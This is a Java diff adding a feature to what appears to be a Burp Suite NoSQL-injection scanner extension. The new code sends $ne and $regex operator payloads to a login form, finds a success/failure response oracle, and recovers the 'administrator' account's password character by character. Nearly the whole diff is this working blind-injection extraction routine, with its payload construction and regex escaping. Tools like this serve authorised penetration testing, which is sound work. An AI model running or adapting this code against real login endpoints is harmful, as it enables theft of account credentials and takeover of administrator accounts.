@@ -81,6 +81,11 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
         jsScan.addActionListener(e -> executor.submit(() -> runJsScan(selectedRR)));
         mainMenu.add(jsScan);
 
+        // Data Extraction (opt-in, request-heavy)
+        JMenuItem extractScan = new JMenuItem("Extract Field Data ($regex, opt-in)");
+        extractScan.addActionListener(e -> executor.submit(() -> runRegexExtract(selectedRR)));
+        mainMenu.add(extractScan);
+
         // Time-Based
         JMenuItem timeScan = new JMenuItem("Time-Based Blind (3s delay)");
         timeScan.addActionListener(e -> executor.submit(() -> runTimeScan(selectedRR)));
@@ -527,6 +532,156 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
         if (!suppressSummaries && findings > 0)
             showScanSummary("JavaScript Injection", baseRR.request().url(), findings);
         return findings;
+    }
+
+    // ─────────────────────────────────────────────────────────────
+    // DATA EXTRACTION ($regex prefix search, opt-in)
+    // ─────────────────────────────────────────────────────────────
+
+    /** Characters tried per position, roughly by likelihood. */
+    private static final String EXTRACT_CHARSET =
+        "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        + "!@#$%^&*()_-+=[]{};:,.<>?/|~";
+
+    /**
+     * Extract a field's value character-by-character via $regex prefix
+     * search, using the login success/failure difference as the oracle.
+     * Opt-in because it sends one request per candidate character.
+     * Target username is "administrator" (the common high-value account).
+     */
+    private int runRegexExtract(HttpRequestResponse baseRR) {
+        flog.log("\n[EXTRACT] Starting $regex extraction → " + baseRR.request().url());
+        String scanHost = hostOf(baseRR.request().url());
+        if (!ScanState.tryBegin(scanHost)) {
+            flog.log("[EXTRACT] A scan is already running against " + ScanState.activeHost() +
+                " — cancel it from the NoSQLi Hunter tab first.");
+            return 0;
+        }
+
+        List<SmartBodyDetector.ParsedParam> params = SmartBodyDetector.extractParams(baseRR.request());
+        String userField = guessField(params, "user","username","email","login","name","uname","uid");
+        String passField = guessField(params, "pass","password","pwd","secret","passwd","token","key");
+        if (userField == null || passField == null) {
+            flog.log("[EXTRACT] Could not identify user/password fields.");
+            ScanState.end(scanHost);
+            return 0;
+        }
+        SmartBodyDetector.ParsedParam userParam = null;
+        SmartBodyDetector.ParsedParam passParam = null;
+        for (SmartBodyDetector.ParsedParam p : params) {
+            if (userParam == null && p.name.equals(userField)) userParam = p;
+            if (passParam == null && p.name.equals(passField)) passParam = p;
+        }
+        if (userParam == null || passParam == null) {
+            flog.log("[EXTRACT] User/password fields are not present in the request body.");
+            ScanState.end(scanHost);
+            return 0;
+        }
+        boolean json = userParam.bodyType == SmartBodyDetector.BodyType.JSON
+                    || userParam.bodyType == SmartBodyDetector.BodyType.GRAPHQL;
+
+        // ── Establish the success/failure oracle ──
+        String targetUser = "administrator";
+        String userPart = "{\"$regex\": " + jsonStr("^" + targetUser + ".*") + "}";
+        HttpRequestResponse successRR = send(buildExtractRequest(baseRR, json, params,
+            userParam, passParam, userField, passField, userPart, "{\"$ne\": \"\"}"));
+        int successStatus = successRR.response() != null ? successRR.response().statusCode() : -1;
+
+        HttpRequestResponse failRR = send(buildExtractRequest(baseRR, json, params,
+            userParam, passParam, userField, passField, userPart,
+            "{\"$regex\": " + jsonStr("^NOSQLI_NO_MATCH_ZZ.*") + "}"));
+        int failStatus = failRR.response() != null ? failRR.response().statusCode() : -1;
+
+        if (successStatus == -1 || successStatus == failStatus || successStatus >= 400) {
+            flog.log("[EXTRACT] Could not establish a success/failure oracle (success="
+                + successStatus + ", fail=" + failStatus + "). The target may not be vulnerable, "
+                + "or no user matching '" + targetUser + "' exists.");
+            ScanState.end(scanHost);
+            return 0;
+        }
+        flog.log("[EXTRACT] Oracle established: success=" + successStatus + ", fail=" + failStatus
+            + ". Extracting " + passField + " for '" + targetUser + "' (cancellable from the tab)...");
+
+        // ── Prefix search, one character at a time ──
+        String known = "";
+        StringBuilder extracted = new StringBuilder();
+        HttpRequest lastMatch = null;
+        for (int pos = 0; pos < 64; pos++) {
+            if (cancelRequested("EXTRACT")) { ScanState.end(scanHost); return 0; }
+            boolean matched = false;
+            for (int ci = 0; ci < EXTRACT_CHARSET.length(); ci++) {
+                char c = EXTRACT_CHARSET.charAt(ci);
+                if (cancelRequested("EXTRACT")) { ScanState.end(scanHost); return 0; }
+                throttle();
+                String passPart = "{\"$regex\": " + jsonStr("^" + regexEscape(known + c) + ".*") + "}";
+                HttpRequest req = buildExtractRequest(baseRR, json, params,
+                    userParam, passParam, userField, passField, userPart, passPart);
+                HttpRequestResponse rr = send(req);
+                if (rr.response() != null && rr.response().statusCode() == successStatus) {
+                    known = known + c;
+                    extracted.append(c);
+                    lastMatch = req;
+                    flog.log("[EXTRACT] Progress: " + extracted);
+                    matched = true;
+                    break;
+                }
+            }
+            if (!matched) break; // no candidate matched → end of value
+        }
+
+        ScanState.end(scanHost);
+        if (extracted.length() == 0) {
+            flog.log("[EXTRACT] Nothing extracted.");
+            return 0;
+        }
+        flog.log("[EXTRACT] DONE: " + passField + " = " + extracted);
+        flog.reportFinding(new FindingsLogger.Finding(
+            "DATA-EXTRACT", "HIGH",
+            baseRR.request().url(),
+            userField + "+" + passField,
+            "$regex prefix search (" + passField + " of '" + targetUser + "')",
+            lastMatch != null ? lastMatch.toString() : "",
+            "Extracted value: " + extracted + " | oracle: success=" + successStatus
+                + " vs fail=" + failStatus,
+            null
+        ));
+        if (!suppressSummaries)
+            showScanSummary("$regex Data Extraction", baseRR.request().url(), 1);
+        return 1;
+    }
+
+    private HttpRequest buildExtractRequest(HttpRequestResponse baseRR, boolean json,
+            List<SmartBodyDetector.ParsedParam> params,
+            SmartBodyDetector.ParsedParam userParam, SmartBodyDetector.ParsedParam passParam,
+            String userField, String passField, String userJsonPart, String passJsonPart) {
+        PayloadDatabase.AuthBypassPair pair =
+            new PayloadDatabase.AuthBypassPair(userJsonPart, passJsonPart, "extraction probe");
+        SmartBodyDetector.BodyType forceType = json
+            ? SmartBodyDetector.BodyType.JSON
+            : SmartBodyDetector.BodyType.URL_ENCODED;
+        return buildAuthBypassRequest(baseRR, forceType, pair,
+            userParam, passParam, userField, passField, params);
+    }
+
+    /** Escape regex metacharacters in a literal prefix. */
+    private static String regexEscape(String s) {
+        StringBuilder sb = new StringBuilder();
+        for (char c : s.toCharArray()) {
+            if ("\\^$.|?*+()[]{}".indexOf(c) >= 0) sb.append('\\');
+            sb.append(c);
+        }
+        return sb.toString();
+    }
+
+    /** JSON string literal with escaping (for embedding regexes in parts). */
+    private static String jsonStr(String s) {
+        StringBuilder sb = new StringBuilder("\"");
+        for (char c : s.toCharArray()) {
+            if (c == '"' || c == '\\') sb.append('\\').append(c);
+            else if (c < 0x20) sb.append(String.format("\\u%04x", (int) c));
+            else sb.append(c);
+        }
+        return sb.append('"').toString();
     }
 
     // ─────────────────────────────────────────────────────────────
